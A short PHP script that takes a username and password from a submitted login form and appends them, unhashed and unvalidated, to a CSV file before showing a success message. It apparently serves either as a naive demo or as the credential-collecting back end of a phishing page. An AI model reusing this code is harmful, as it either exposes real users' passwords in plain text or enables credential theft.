<?php
// Get form data
$username = $_POST['username'];
$password = $_POST['password'];

// Optional: timestamp
$timestamp = date("Y-m-d H:i:s");

// Save to CSV
$file = fopen("logins.csv", "a");
fputcsv($file, [$timestamp, $username, $password]);
fclose($file);

// Redirect or confirm
echo "<h2>✅ Login info saved successfully!</h2>";
echo "<a href='login.html'>Back to Login</a>";
?>
